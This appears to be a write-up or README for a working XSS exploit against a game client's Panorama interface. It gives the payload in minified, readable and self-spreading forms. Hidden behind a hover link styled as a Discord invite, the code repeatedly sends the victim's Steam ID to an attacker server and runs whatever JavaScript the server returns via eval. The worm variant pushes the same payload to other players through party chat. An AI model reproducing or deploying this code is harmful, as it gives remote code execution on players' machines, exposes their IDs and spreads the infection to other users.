# MINIFIED:

This has escaped double quotes due to it being included with quotes when sending to the client.

```XML
<a onmouseover=\"javascript:function sendRequest(){return new Promise(function(e,t){try{$.AsyncWebRequest('http://SERVERADDRESS:PORT/',{type:'POST',data:{steamid:MyPersonaAPI.GetXuid()},complete:function(t){e(t)},timeout:6e4,headers:{}})}catch(e){t(e)}})}function doSendRequestLoop(){$.Schedule(1,function(){sendRequest().then(function(res){if('object'==typeof $.remoteCodeExecution&&!1===$.remoteCodeExecution.stopped&&doSendRequestLoop(),null===res.responseText||res.responseText.trim().length<=0)return;let json=void 0;try{json=JSON.parse(res.responseText.substring(0,res.responseText.length-1))}catch(e){}if(void 0!==json){if('boolean'==typeof json.kill&&!0===json.kill)return $.remoteCodeExecution.stopped=!0,void delete $.remoteCodeExecution;if('string'!=typeof json.eval);else try{eval(json.eval)}catch(e){}}}).catch(function(e){})})}void 0===$.remoteCodeExecution&&(doSendRequestLoop(),$.remoteCodeExecution={stopped:!1});\"><font color=\"#ff0000\">JOIN</font> <font color=\"#00ff12\">discord.gg/INVITECODE</font> <font color=\"#ff0000\">&lt;&lt;&lt;&lt;&lt;-------------------------------------------------------------------------------</font></a>
```

# NORMAL:

There are no arrow functions, which I would normally use, because they had issues with Panorama's XML style.

```JS
function sendRequest() {
	return new Promise(function async (resolve, reject) {
		try {
			$.AsyncWebRequest("http://SERVERADDRESS:PORT/", {
				type: "POST",
				data: {
					steamid: MyPersonaAPI.GetXuid()
				},
				complete: function (response) {
					resolve(response);
				},
				timeout: 60000,
				headers: {}
			});
		} catch(err) {
			reject(err);
		}
	});
}

function doSendRequestLoop() {
	$.Schedule(1, function () {
		sendRequest().then(function (res) {
			if (typeof $.remoteCodeExecution === "object" && $.remoteCodeExecution.stopped === false) {
				doSendRequestLoop();
			}

			if (res.responseText === null || res.responseText.trim().length <= 0) {
				return;
			}

			let json = undefined;
			try {
				json = JSON.parse(res.responseText.substring(0, res.responseText.length - 1));
			} catch(e) {
			};

			if (json === undefined) {
				return;
			}

			if (typeof json.kill === "boolean" && json.kill === true) {
				$.remoteCodeExecution.stopped = true;
				delete $.remoteCodeExecution;
				return;
			}

			if (typeof json.eval === "string") {
				try {
					eval(json.eval);
				} catch(err) {
				}

				return;
			}
		}).catch(function (err) {
		});
	});
}

(function () {
	// Only run this if we didn't do it yet
	if (typeof $.remoteCodeExecution !== "undefined") {
		return;
	}

	doSendRequestLoop();

	// Create remoteCodeExecution so we dont run this again
	$.remoteCodeExecution = {
		stopped: false
	};
})();
```

# SELF-SPREADING:

Using the Panorama API you were able to make the client you had injected to send the **same** malicious message again and everyone hovering would have gotten infected with it. Basically making it self-spreading. **This was never used.**

```JS
PartyListAPI.SessionCommand("Game::ChatReportMatchmakingStatus", `run all xuid ${MyPersonaAPI.GetXuid()} status <a/onmouseover="javascript:function sendRequest(){return new Promise(function(e,t){try{$.AsyncWebRequest('http://SERVERADDRESS:PORT/',{type:'POST',data:{steamid:MyPersonaAPI.GetXuid()},complete:function(t){e(t)},timeout:6e4,headers:{}})}catch(e){t(e)}})}function doSendRequestLoop(){$.Schedule(1,function(){sendRequest().then(function(res){if('object'==typeof $.remoteCodeExecution&&!1===$.remoteCodeExecution.stopped&&doSendRequestLoop(),null===res.responseText||res.responseText.trim().length<=0)return;let json=void 0;try{json=JSON.parse(res.responseText.substring(0,res.responseText.length-1))}catch(e){}if(void 0!==json){if('boolean'==typeof json.kill&&!0===json.kill)return $.remoteCodeExecution.stopped=!0,void delete $.remoteCodeExecution;if('string'!=typeof json.eval);else try{eval(json.eval)}catch(e){}}}).catch(function(e){})})}void 0===$.remoteCodeExecution&&(doSendRequestLoop(),$.remoteCodeExecution={stopped:!1});">discord.gg/INVITECODE</a>`);
```
